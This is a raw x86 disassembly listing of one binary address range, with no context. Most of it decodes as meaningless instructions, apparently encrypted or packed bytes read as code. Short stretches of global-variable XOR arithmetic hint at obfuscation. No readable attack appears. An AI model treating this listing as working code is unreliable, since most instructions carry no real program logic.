  40863e:	hlt    
  40863f:	pushf  
  408640:	jnp    0x4085fe
  408642:	test   eax,0xd2f852af
  408647:	mov    DWORD PTR [edx+eiz*4-0x6a723a44],ebp
  40864e:	scas   eax,DWORD PTR es:[edi]
  40864f:	add    edi,edi
  408651:	out    dx,al
  408652:	mov    bh,0x74
  408654:	add    DWORD PTR [edx-0x1801689c],0x35
  40865b:	loop   0x4085f9
  40865d:	push   edi
  40865e:	aaa    
  40865f:	add    cl,BYTE PTR [esi-0x5e]
  408662:	mov    BYTE PTR [ebx+ebx*4+0x75f55e7d],al
  408669:	lods   al,BYTE PTR ds:[esi]
  40866a:	adc    al,0x85
  40866c:	pop    edi
  40866d:	and    eax,0xd9840667
  408672:	fs call 0xf4ed:0xb3e807ca
  40867a:	mov    ds:0xa74477a9,al
  40867f:	mov    cl,BYTE PTR [ebx+0x71]
  408682:	cld    
  408683:	sub    ebx,DWORD PTR [ebp+edi*2-0x55]
  408687:	loope  0x408672
  408689:	adc    DWORD PTR [edx+0x77],esp
  40868c:	jg     0x4086b0
  40868e:	xor    bh,BYTE PTR [ecx-0x4b]
  408691:	imul   DWORD PTR [edi+esi*1-0x1e35486f]
  408698:	xor    dl,BYTE PTR [eax-0x45]
  40869b:	mov    eax,0x818e12fe
  4086a0:	adc    eax,0x4337e3
  4086a5:	jnp    0x4086de
  4086a7:	inc    ebx
  4086a8:	add    BYTE PTR [ecx+0x1d81f45d],cl
  4086ae:	outs   dx,DWORD PTR ds:[esi]
  4086af:	cmp    BYTE PTR [ebx+0x0],al
  4086b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086b3:	cmp    BYTE PTR [ebx+0x0],al
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx+0x5171e04a],ecx
  4086ca:	ret    0xd68a
  4086cd:	jle    0x40874d
  4086cf:	and    al,0x7c
  4086d1:	jle    0x408751
  4086d3:	icebp  
  4086d4:	adc    al,0x48
  4086d6:	clc    
  4086d7:	push   0xd076052
  4086dc:	xor    DWORD PTR ds:0x98d2a395,edx
  4086e2:	leave  
  4086e3:	mov    dl,0x4
  4086e5:	and    BYTE PTR [esi],al
  4086e7:	mov    esp,0xc50d3494
  4086ec:	sti    
  4086ed:	cmp    eax,0x56f36659
  4086f2:	ret    
  4086f3:	jne    0x4086f0
  4086f5:	dec    esp
  4086f6:	aas    
  4086f7:	and    al,0xf1
  4086f9:	xchg   ebx,eax
  4086fa:	ret    0x5bc8
  4086fd:	xchg   ecx,eax
  4086fe:	iret   
  4086ff:	sbb    ecx,DWORD PTR [eax+0x50]
  408702:	shl    BYTE PTR [ebx-0x27],0xc8
  408706:	out    0x74,al
  408708:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408709:	pop    ebp
  40870a:	bound  edx,QWORD PTR [ecx-0x49]
  40870d:	pop    ebp
  40870e:	stos   BYTE PTR es:[edi],al
  40870f:	not    esp
  408711:	pop    ds
  408712:	mov    al,ds:0xbd0d75e5
  408717:	ret    
  408718:	shl    DWORD PTR [edx+0x132895a8],cl
  40871e:	or     BYTE PTR [ebx-0x6f09da74],al
  408724:	cmp    ebx,DWORD PTR [edi-0x7c14b473]
  40872a:	xor    ecx,DWORD PTR [ebx+0x22101a7]
  408730:	jnp    0x408731
  408732:	inc    ebp
  408733:	jno    0x4086ef
  408735:	stos   DWORD PTR es:[edi],eax
  408736:	fild   WORD PTR ds:0x240a00f8
  40873c:	jae    0x4086df
  40873e:	add    esp,DWORD PTR [edx-0x6780394c]
  408744:	sbb    bh,0xea
  408747:	jl     0x408776
  408749:	sbb    BYTE PTR ss:[esi-0x1475f8fd],bl
  408750:	add    al,0xf9
  408752:	jmp    0x4087cd
  408754:	jp     0x40876c
  408756:	push   ss
  408757:	in     eax,0x4
  408759:	inc    ebx
  40875a:	fisttp WORD PTR [ecx-0x2d2044c0]
  408760:	or     eax,DWORD PTR [ebp+0x12]
  408763:	cmp    esi,0xffffffdc
  408766:	es into 
  408768:	add    eax,0x816ff394
  40876d:	mov    al,0xcf
  40876f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408770:	lahf   
  408771:	das    
  408772:	loope  0x408703
  408774:	test   DWORD PTR [eax],esi
  408776:	lock pusha 
  408778:	iret   
  408779:	xor    DWORD PTR [ebx-0x76c72b50],esi
  40877f:	xor    ebx,DWORD PTR [edx+esi*2+0x35]
  408783:	pop    ecx
  408784:	(bad)  
  408785:	cli    
  408786:	(bad)  ds:0xd8b4f030
  40878c:	popa   
  40878d:	push   ebx
  40878e:	adc    esi,DWORD PTR [ebx+edx*4+0x7c]
  408792:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408793:	addr16 repnz daa 
  408796:	push   ebp
  408797:	and    eax,0x9d5d57a2
  40879c:	mov    edi,0xed1e20d3
  4087a1:	(bad)  [ebx-0x55]
  4087a4:	jl     0x40873c
  4087a6:	stos   BYTE PTR es:[edi],al
  4087a7:	jmp    0xd48916a2
  4087ac:	sbb    eax,0x8c077f09
  4087b1:	sub    eax,DWORD PTR [ebx+0x2ee74651]
  4087b7:	inc    ebx
  4087b8:	dec    ecx
  4087b9:	adc    esp,DWORD PTR [ebx+0xa]
  4087bc:	cmp    BYTE PTR [edi],dh
  4087be:	repnz inc edx
  4087c0:	es out dx,eax
  4087c2:	cmp    bh,BYTE PTR [edi]
  4087c4:	dec    eax
  4087c5:	mov    al,0x5
  4087c7:	pop    esi
  4087c8:	mov    bl,0x73
  4087ca:	xchg   ecx,eax
  4087cb:	sbb    DWORD PTR [esi+0x67],esp
  4087ce:	bound  edi,QWORD PTR [ecx-0x2ba67198]
  4087d4:	aas    
  4087d5:	pop    edx
  4087d6:	gs aad 0x33
  4087d9:	popf   
  4087da:	mov    ch,0x15
  4087dc:	in     al,dx
  4087dd:	pusha  
  4087de:	jl     0x408781
  4087e0:	cmp    al,0x5f
  4087e2:	sbb    al,0x20
  4087e4:	and    dh,cl
  4087e6:	xchg   BYTE PTR [ecx+0x28],cl
  4087e9:	xor    esi,edx
  4087eb:	nop
  4087ec:	fimul  WORD PTR [esi+0x4c]
  4087ef:	dec    ebp
  4087f0:	xchg   ecx,eax
  4087f1:	popa   
  4087f2:	push   eax
  4087f3:	nop
  4087f4:	add    al,BYTE PTR [edi-0x30264ced]
  4087fa:	repnz dec esi
  4087fc:	mov    dl,0x6a
  4087fe:	or     edx,DWORD PTR ds:0x2deeb565
  408804:	sahf   
  408805:	test   eax,0x72b10f0
  40880a:	int3   
  40880b:	sub    BYTE PTR [edx+0x7a402160],bh
  408811:	rcr    BYTE PTR [esp+ecx*2],1
  408814:	(bad)  
  408816:	sbb    DWORD PTR [ecx-0x5a],esi
  408819:	jl     0x408894
  40881b:	ss add eax,0xea96e146
  408821:	mov    dh,0xfa
  408823:	xchg   edi,eax
  408824:	aas    
  408825:	push   ebx
  408826:	arpl   WORD PTR [ebx*1+0x4b4109bc],cx
  40882d:	shl    DWORD PTR [esi],0xb8
  408830:	mov    dh,0xf4
  408832:	or     esi,edi
  408834:	je     0x4087ff
  408836:	into   
  408837:	mov    eax,0x93945b82
  40883c:	pop    ebp
  40883d:	bound  edx,QWORD PTR [edi+0x69]
  408840:	or     bl,BYTE PTR [ecx-0xff86a0f]
  408846:	mov    esp,0xa70ec968
  40884b:	adc    esi,DWORD PTR [esi+0x56d25e10]
  408851:	xchg   edi,eax
  408852:	dec    edi
  408853:	xor    dh,BYTE PTR [ebx]
  408855:	ja     0x408830
  408857:	pop    esp
  408858:	or     BYTE PTR [ebx-0x6b],cl
  40885b:	xchg   ebp,eax
  40885c:	aaa    
  40885d:	shl    DWORD PTR [ecx],cl
  40885f:	shr    al,cl
  408861:	inc    ecx
  408862:	aas    
  408863:	daa    
  408864:	pop    esp
  408865:	adc    esi,edx
  408867:	mov    ds:0x5938b7b,al
  40886c:	pop    edi
  40886d:	jne    0x40885c
  40886f:	ror    BYTE PTR [edx-0x23],0x78
  408873:	fisub  WORD PTR [eax-0xa]
  408876:	leave  
  408877:	adc    al,0x33
  408879:	cmp    DWORD PTR [ebp+0x58],esp
  40887c:	cli    
  40887d:	push   ds
  40887e:	mov    edx,0x6933945b
  408883:	push   ecx
  408884:	pop    esi
  408885:	sahf   
  408886:	push   ecx
  408887:	xor    BYTE PTR [edi+0x3c47f604],cl
  40888d:	cmp    esp,DWORD PTR [eax-0x1f3628c9]
  408893:	aas    
  408894:	scas   al,BYTE PTR es:[edi]
  408895:	in     al,dx
  408896:	jmp    0x4088c7
  408898:	mov    bl,0xf4
  40889a:	adc    edx,ebx
  40889c:	rol    DWORD PTR [edx-0x3e],0xd
  4088a0:	lock dec ebx
  4088a2:	mov    al,ds:0x352da51d
  4088a7:	sbb    eax,0x440ca7e5
  4088ac:	lock lods eax,DWORD PTR ds:[esi]
  4088ae:	fisubr DWORD PTR [edx-0x6d3c217d]
  4088b4:	loopne 0x4088c5
  4088b6:	fwait
  4088b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088b8:	jg     0x408869
  4088ba:	mov    ah,0xe6
  4088bc:	aad    0x70
  4088be:	leave  
  4088bf:	and    al,BYTE PTR [ebx+0x2d]
  4088c2:	xor    BYTE PTR [edi+edi*4-0x5b],bh
  4088c6:	outs   dx,DWORD PTR ds:[esi]
  4088c7:	xchg   BYTE PTR [ebx-0x76],dl
  4088ca:	imul   ecx,esi,0x45
  4088cd:	repz mov ?,eax
  4088d0:	mov    ebx,0xa6af04eb
  4088d5:	pop    es
  4088d6:	inc    ebp
  4088d7:	popf   
  4088d8:	inc    edi
  4088d9:	xlat   BYTE PTR ds:[ebx]
  4088da:	jg     0x4088d4
  4088dc:	inc    eax
  4088dd:	add    ebp,DWORD PTR [ebx+edi*2-0x722d29e7]
  4088e4:	stc    
  4088e5:	xor    al,0x81
  4088e7:	mov    ds:0xfb3c33f1,al
  4088ec:	cmp    esp,esi
  4088ee:	adc    DWORD PTR [ebx-0x39bd779b],edi
  4088f4:	pop    ss
  4088f5:	sbb    dl,BYTE PTR ds:0x429705c
  4088fb:	imul   edx,DWORD PTR [ebp+0x3581008b],0xffffffe3
  408902:	aaa    
  408903:	inc    ebx
  408904:	add    BYTE PTR [edx],ch
  408906:	jl     0x408908
  408908:	add    BYTE PTR [esi-0x75],ah
  40890b:	dec    ebp
  40890c:	cld    
  40890d:	adc    DWORD PTR ds:0x43385b,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x4337d3,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43379f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x4338a7,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0xf0b5ad2c
  408968:	jecxz  0x40891a
  40896a:	aam    0x7e
  40896c:	jle    0x408992
  40896e:	jl     0x4089ee
  408970:	jle    0x408940
  408972:	jo     0x408990
  408974:	dec    eax
  408975:	out    dx,eax
  408976:	add    BYTE PTR [ebx-0x27],0x98
  40897a:	push   ebx
  40897b:	ins    BYTE PTR es:[edi],dx
  40897c:	xor    eax,0xca5338cc
  408981:	aas    
  408982:	wbinvd 
  408984:	lods   al,BYTE PTR ds:[esi]
  408985:	lock xor eax,0x8e09a74
  40898b:	mov    edx,esp
  40898d:	sti    
  40898e:	nop
  40898f:	retf   0x7a26
  408992:	push   cs
  408993:	cmp    esi,DWORD PTR [ebx+edx*4+0x6f]
  408997:	arpl   WORD PTR [ebx+ecx*1+0x35],bp
  40899b:	push   es
  40899c:	adc    DWORD PTR [ebx-0x1651cff2],esp
  4089a2:	and    bl,dl
  4089a4:	add    DWORD PTR [esi],edx
  4089a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089a7:	sub    ebp,DWORD PTR [edx+0x12b2c4a5]
  4089ad:	add    al,0x9b
  4089af:	sbb    BYTE PTR [ebp-0x1e],bh
  4089b2:	fild   QWORD PTR [ecx+0x3141472d]
  4089b8:	push   edx
  4089b9:	inc    ecx
  4089ba:	into   
  4089bb:	pop    ebx
  4089bc:	pop    esi
  4089bd:	(bad)  
  4089be:	popa   
  4089bf:	pop    ss
  4089c0:	enter  0x3b34,0x16
  4089c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089c5:	hlt    
  4089c6:	push   0xffffffdd
  4089c8:	lds    edi,FWORD PTR [esi]
  4089ca:	mov    ds:0xafcbc642,al
  4089cf:	lds    edx,FWORD PTR [edi]
  4089d1:	jl     0x408980
  4089d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089d4:	cmp    dl,BYTE PTR [eax]
  4089d6:	addr16 in al,0x73
  4089d9:	frstor [esp+edx*1-0x55a507c]
  4089e0:	(bad)  
  4089e1:	sbb    dl,BYTE PTR [eax+0x3283b01]
  4089e7:	leave  
  4089e8:	out    dx,eax
  4089e9:	jl     0x408a4e
  4089eb:	add    dh,BYTE PTR [edx-0x7e]
  4089ee:	fimul  DWORD PTR [ecx+0x32]
  4089f1:	xchg   edx,eax
  4089f2:	aaa    
  4089f3:	(bad)  [esi]
  4089f5:	out    0xa3,al
  4089f7:	clc    
  4089f8:	sbb    eax,0xea8756fa
  4089fd:	jmp    0xb70e3327
  408a02:	scas   eax,DWORD PTR es:[edi]
  408a03:	call   0x7e66b450
  408a08:	ins    BYTE PTR es:[edi],dx
  408a09:	retf   
  408a0a:	jle    0x408a53
  408a0c:	xor    ebp,DWORD PTR [edx-0x30ab8798]
  408a12:	jmp    0x53c7474
  408a17:	es pop es
  408a19:	push   esp
  408a1a:	loope  0x4089f6
  408a1c:	jns    0x408a85
  408a1e:	pushf  
  408a1f:	adc    al,0xd
  408a21:	fnstcw WORD PTR [ecx]
  408a23:	ds in  al,dx
  408a25:	pop    edi
  408a26:	dec    edi
  408a27:	dec    esp
  408a28:	mov    ?,esp
  408a2a:	(bad)  
  408a2b:	mov    ds:0x6a73809b,eax
  408a30:	and    BYTE PTR [ecx],al
  408a32:	sbb    BYTE PTR [esi+0x242d5c68],ah
  408a38:	mov    edi,ebp
  408a3a:	add    al,BYTE PTR [edi+0x4b]
  408a3d:	imul   ebp,ebx,0x9b382f44
  408a43:	sbb    ebx,DWORD PTR [ecx]
  408a45:	pushf  
  408a46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a47:	pop    ecx
  408a48:	stos   DWORD PTR es:[edi],eax
  408a49:	cmp    DWORD PTR [esi-0x69dadfb2],ecx
  408a4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a50:	cmp    al,0xde
  408a52:	pusha  
  408a53:	mov    ds:0x38b3fef8,al
  408a58:	aaa    
  408a59:	pop    ss
  408a5a:	dec    ebp
  408a5b:	push   0x909d1336
  408a60:	fmul   QWORD PTR [ecx-0xd]
  408a63:	inc    esp
  408a64:	or     cl,BYTE PTR [eax]
  408a66:	cmp    eax,0xf05c0be5
  408a6b:	pop    esp
  408a6c:	in     al,dx
  408a6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a6e:	mov    dl,0x26
  408a70:	out    dx,al
  408a71:	ja     0x408a0f
  408a73:	add    edi,DWORD PTR [edi-0x328854ba]
  408a79:	mov    BYTE PTR [ecx+0x5d353b9f],al
  408a7f:	clc    
  408a80:	xor    al,0x5a
  408a82:	add    BYTE PTR [ecx+0x2a],ah
  408a85:	jbe    0x408b01
  408a87:	sbb    DWORD PTR [ecx],ebx
  408a89:	xor    edx,ecx
  408a8b:	mov    edx,0x86675d54
  408a90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a91:	(bad)  
  408a92:	clc    
  408a93:	cmp    BYTE PTR [eax-0x1492545],bl
  408a99:	fsubr  DWORD PTR [esi-0x15157b68]
  408a9f:	scas   eax,DWORD PTR es:[edi]
  408aa0:	sbb    eax,0xb8765e7f
  408aa5:	fucomp st(1)
  408aa7:	int    0xe1
  408aa9:	sbb    al,0xa1
  408aab:	xor    DWORD PTR [edx],ebx
  408aad:	popfw  
  408aaf:	and    eax,0x1ac1645b
  408ab4:	in     al,dx
  408ab5:	mov    bh,0x29
  408ab7:	xchg   edx,eax
  408ab8:	mov    DWORD PTR cs:[ecx-0x5c],ecx
  408abc:	adc    cl,0x63
  408abf:	cmp    al,al
  408ac1:	in     eax,0x85
  408ac3:	or     dl,BYTE PTR [edi+0x2c33aba1]
  408ac9:	arpl   WORD PTR [edi-0x3b8f8763],bp
  408acf:	mov    ds:0x9df30129,eax
  408ad4:	fadd   DWORD PTR [ebx-0x67]
  408ad7:	clc    
  408ad8:	mov    ds:0x74899db2,al
  408add:	add    ebp,esp
  408adf:	idiv   DWORD PTR [edi+0x1e]
  408ae2:	sar    BYTE PTR [ebx+0x5596f99],1
  408ae8:	xchg   esp,eax
  408ae9:	repz jns 0x408a98
  408aec:	xchg   edi,eax
  408aed:	out    0x41,eax
  408aef:	clc    
  408af0:	sahf   
  408af1:	or     BYTE PTR [ebx+ecx*2+0x19],cl
  408af5:	mov    esp,0x5988f8e0
  408afa:	inc    ecx
  408afb:	push   ecx
  408afc:	into   
  408afd:	pop    ds
  408afe:	in     eax,dx
  408aff:	adc    BYTE PTR [esi-0x1cbbf314],0x3a
  408b06:	test   BYTE PTR [edi+0x5f3c9e45],0x94
  408b0d:	arpl   WORD PTR [ebx+0x63fb7cbe],sp
  408b13:	rcl    ah,1
  408b15:	daa    
  408b16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b17:	add    al,al
  408b19:	or     DWORD PTR [eax+0x71],edi
  408b1c:	lea    ecx,[edi-0x48]
  408b1f:	push   ds
  408b20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b21:	rcr    ah,0x7b
  408b24:	and    eax,ebx
  408b26:	test   ah,ah
  408b28:	xchg   ebp,eax
  408b29:	fistp  QWORD PTR fs:[edi+0x27671e10]
  408b30:	ret    0xc0df
  408b33:	sub    al,0x71
  408b35:	dec    esi
  408b36:	out    dx,al
  408b37:	adc    BYTE PTR [eax+0xa6c08e8],dl
  408b3d:	icebp  
  408b3e:	mov    cl,0xc7
  408b40:	std    
  408b41:	test   eax,0x4769b06f
  408b46:	push   edi
  408b47:	push   edi
  408b48:	inc    ecx
  408b49:	sub    DWORD PTR [ebx],edi
  408b4b:	jp     0x408b47
  408b4d:	outs   dx,BYTE PTR ds:[esi]
  408b4e:	pop    ss
  408b4f:	out    dx,eax
  408b50:	or     DWORD PTR [edi-0x270927bc],ecx
  408b56:	fcom   DWORD PTR [eax+0x1e]
  408b59:	xchg   edx,eax
  408b5a:	pop    ebx
  408b5b:	int3   
  408b5c:	and    al,0x37
  408b5e:	mov    ds:0xdad93f60,al
  408b63:	sahf   
  408b64:	push   ebx
  408b65:	xchg   edi,eax
  408b66:	div    BYTE PTR [esi+eax*1-0x40]
  408b6a:	add    eax,0x35ab2d3
  408b6f:	push   0x22
  408b71:	dec    ebp
  408b72:	rol    BYTE PTR [ecx-0x45],cl
  408b75:	shl    BYTE PTR [eax+0x5957d512],1
  408b7b:	sbb    edx,esi
  408b7d:	les    ebx,FWORD PTR [ebx+edi*8-0x3f]
  408b81:	dec    ebx
  408b82:	aam    0xc4
  408b84:	inc    esi
  408b85:	mov    eax,ds:0xc6e26124
  408b8a:	mov    edx,0x492e3f85
  408b8f:	gs push cs
  408b91:	cmp    DWORD PTR [ebx],esp
  408b93:	xchg   BYTE PTR [ebx-0xb48de66],al
  408b99:	bound  ebx,QWORD PTR [edi+ecx*1-0x7b]
  408b9d:	sbb    eax,0x8b000000
  408ba2:	inc    ebp
  408ba3:	or     BYTE PTR [ebx-0x39cc0fb3],cl
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	jl     0x408b8c
  408bf2:	or     esi,DWORD PTR [eax+0x66]
  408bf5:	sar    BYTE PTR [esi+0x7e],cl
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	in     al,0xb8
  408bfe:	ins    DWORD PTR es:[edi],dx
  408bff:	add    al,0x29
  408c01:	mov    ds:0x4557a10e,eax
  408c06:	mov    ebx,0x654d1bb3
  408c0b:	and    bh,BYTE PTR [edi+0x7f]
  408c0e:	fisttp DWORD PTR ds:0x3207dce9
  408c14:	(bad)  
  408c15:	pop    ecx
  408c16:	fmul   DWORD PTR [ebx+eiz*4]
  408c19:	fdiv   DWORD PTR [eax]
  408c1b:	xlat   BYTE PTR ds:[ebx]
  408c1c:	loop   0x408bd5
  408c1e:	lock inc edx
  408c20:	adc    BYTE PTR ds:0xef12dee3,dl
  408c26:	cmp    al,0xb9
  408c28:	(bad)  [esi+0x55]
  408c2b:	and    BYTE PTR [edx-0x4c3ec3a6],0x4b
  408c32:	push   eax
  408c33:	sti    
  408c34:	cmp    dh,bh
  408c36:	dec    edi
  408c37:	xchg   BYTE PTR [ebx+0x25feccc9],cl
  408c3d:	xchg   edx,eax
  408c3e:	jl     0x408c8f
  408c40:	push   0x43317c50
  408c45:	push   edx
  408c46:	xchg   ecx,eax
  408c47:	repz adc DWORD PTR [ecx+0x3c],edx
  408c4b:	adc    esi,edi
  408c4d:	xor    al,0x4b
  408c4f:	int3   
  408c50:	call   0x28964328
  408c55:	push   ebx
  408c56:	dec    esi
  408c57:	pop    ecx
  408c58:	fistp  DWORD PTR [ebx+0x255bbb12]
  408c5e:	stos   DWORD PTR es:[edi],eax
  408c5f:	sub    al,0xad
  408c61:	or     al,0x27
  408c63:	mov    bl,0x78
  408c65:	dec    esp
  408c66:	shl    ecx,1
  408c68:	stos   DWORD PTR es:[edi],eax
  408c69:	ret    
  408c6a:	pop    ecx
  408c6b:	pusha  
  408c6c:	call   0x1ccdcc39
  408c71:	call   0x435a:0x24c9520f
  408c78:	call   FWORD PTR [esi-0x6557fd25]
  408c7e:	push   edi
  408c7f:	push   cs
  408c80:	aaa    
  408c81:	xor    al,BYTE PTR [esi]
  408c83:	inc    ebp
  408c84:	inc    ebp
  408c85:	pop    esi
  408c86:	mov    ebp,0x82c361de
  408c8b:	lods   eax,DWORD PTR ds:[esi]
  408c8c:	push   0xc34c2c37
  408c91:	sbb    eax,0xe82c7a26
  408c96:	int    0x3
  408c98:	sbb    al,0xc
  408c9a:	(bad)
  408c9e:	scas   al,BYTE PTR es:[edi]
  408c9f:	xchg   edi,eax
  408ca0:	mov    ch,0x2c
  408ca2:	sbb    eax,0xb4c3e9a8
  408ca7:	add    ecx,DWORD PTR [ebx-0x1d]
  408caa:	mov    eax,0xc441dc0
  408caf:	into   
  408cb0:	fadd   DWORD PTR gs:[ecx]
  408cb3:	daa    
  408cb4:	shl    DWORD PTR [ecx+edi*4+0x7d0091ef],0x82
  408cbc:	aaa    
  408cbd:	pop    ds
  408cbe:	cmp    DWORD PTR [esp+ebp*1-0x25],0xb0f44eb1
  408cc6:	shl    DWORD PTR [esi+0x5f],1
  408cc9:	jp     0x408ca0
  408ccb:	adc    DWORD PTR [ebp-0x1e2d12f3],edx
  408cd1:	sar    BYTE PTR [ebx-0x22],1
  408cd4:	ins    DWORD PTR es:[edi],dx
  408cd5:	std    
  408cd6:	jo     0x408cc4
  408cd8:	mov    DWORD PTR [edx-0x7b468ae7],0x8f38615d
  408ce2:	mov    eax,ds:0x882fe8a5
  408ce7:	jp     0x408d12
  408ce9:	enter  0x28ff,0x57
  408ced:	jae    0x408d38
  408cef:	xchg   esp,eax
  408cf0:	mov    cl,0x3d
  408cf2:	or     eax,0x78901207
  408cf7:	xchg   edx,eax
  408cf8:	test   BYTE PTR [esi-0x6c086d85],0xf1
  408cff:	pop    ss
  408d00:	and    BYTE PTR [esp+edx*8-0x22e1895],al
  408d07:	loope  0x408d6a
  408d09:	xor    eax,0x9975d182
  408d0e:	jnp    0x408d5d
  408d10:	mov    bh,0x19
  408d12:	dec    edi
  408d13:	inc    esi
  408d14:	fbld   TBYTE PTR [edx]
  408d16:	into   
  408d17:	inc    ecx
  408d18:	pop    ss
  408d19:	mov    esi,0x647d2ead
  408d1e:	stos   DWORD PTR es:[edi],eax
  408d1f:	into   
  408d20:	dec    ebp
  408d21:	aaa    
  408d22:	mov    ebp,0x905941f3
  408d27:	pop    ss
  408d28:	mov    bh,0xa3
  408d2a:	lds    ebx,FWORD PTR [edx]
  408d2c:	mov    ch,0x31
  408d2e:	dec    ebx
  408d2f:	sbb    eax,0x15034a4b
  408d34:	xor    DWORD PTR [edi],ebp
  408d36:	or     eax,0x5dd68415
  408d3b:	or     BYTE PTR [esi-0x3dd20459],dl
  408d41:	jecxz  0x408d7f
  408d43:	mov    cl,0x81
  408d45:	jne    0x408d27
  408d47:	(bad)  
  408d48:	mov    ebp,0xfa6916ed
  408d4d:	hlt    
  408d4e:	mov    eax,0xe595781a
  408d53:	jno    0x408d9f
  408d55:	xchg   dh,dl
  408d57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d58:	ror    cl,1
  408d5a:	pop    ebp
  408d5b:	ficomp DWORD PTR [ecx+0x50]
  408d5e:	xor    DWORD PTR [ecx+0x6df38e31],edx
  408d64:	mov    esi,0x297390a0
  408d69:	aam    0xe5
  408d6b:	not    DWORD PTR [eax-0xd]
  408d6e:	jg     0x408cf8
  408d70:	jns    0x408d51
  408d72:	cli    
  408d73:	repz jnp 0x408dae
  408d76:	je     0x408dbc
  408d78:	sbb    cl,BYTE PTR fs:[ebp+0x63]
  408d7c:	jno    0x408dbd
  408d7e:	pop    ecx
  408d7f:	shl    ebp,1
  408d81:	and    BYTE PTR [ecx],0x2a
  408d84:	aam    0xd
  408d86:	aaa    
  408d87:	clc    
  408d88:	ret    0x3ef7
  408d8b:	(bad)  
  408d8c:	std    
  408d8d:	fs or  eax,0x6981a635
  408d93:	ja     0x408de9
  408d95:	js     0x408da5
  408d97:	mov    eax,0xb33f4686
  408d9c:	clc    
  408d9d:	push   eax
  408d9e:	popa   
  408d9f:	adc    DWORD PTR [ebp+0xef668d3],ebp
  408da5:	leave  
  408da6:	xor    esi,DWORD PTR [edi+0x1dbb55a]
  408dac:	outs   dx,BYTE PTR ds:[esi]
  408dad:	xor    cl,bl
  408daf:	xor    ecx,DWORD PTR [ebp-0x798bae7]
  408db5:	bound  ecx,QWORD PTR [ebx-0x4f]
  408db8:	in     eax,0x63
  408dba:	jmp    0x5d4ce461
  408dbf:	xchg   ebp,eax
  408dc0:	dec    edx
  408dc1:	xor    cl,BYTE PTR [esi+0x3d]
  408dc4:	out    0xbf,eax
  408dc6:	or     al,0x89
  408dc8:	mov    ?,WORD PTR [eax]
  408dca:	or     ebp,edx
  408dcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dcd:	bound  eax,QWORD PTR [ecx-0x7e42f61]
  408dd3:	loopne 0x408dbb
  408dd5:	mov    ecx,0xe5f7a858
  408dda:	sbb    al,0x88
  408ddc:	ret    0x2ed6
  408ddf:	gs int 0x63
  408de2:	jae    0x408d9a
  408de4:	inc    ebx
  408de5:	scas   eax,DWORD PTR es:[edi]
  408de6:	pop    ecx
  408de7:	cs ja  0x408d7e
  408dea:	mov    ch,0x38
  408dec:	push   0xffffffcc
  408dee:	jmp    0x408e0e
  408df0:	inc    ecx
  408df1:	sbb    ebp,DWORD PTR ds:0x471a851b
  408df7:	out    0xb8,al
  408df9:	stos   DWORD PTR es:[edi],eax
  408dfa:	inc    eax
  408dfb:	sbb    al,0xe
  408dfd:	pop    ecx
  408dfe:	xchg   esp,eax
  408dff:	push   ebp
  408e00:	adc    DWORD PTR [ebx-0x4e86a66b],edi
  408e06:	xor    esi,DWORD PTR [edi]
  408e08:	inc    ecx
  408e09:	adc    ch,dh
  408e0b:	stos   DWORD PTR es:[edi],eax
  408e0c:	es dec ecx
  408e0e:	lahf   
  408e0f:	pusha  
  408e10:	jns    0x408d94
  408e12:	pop    ebp
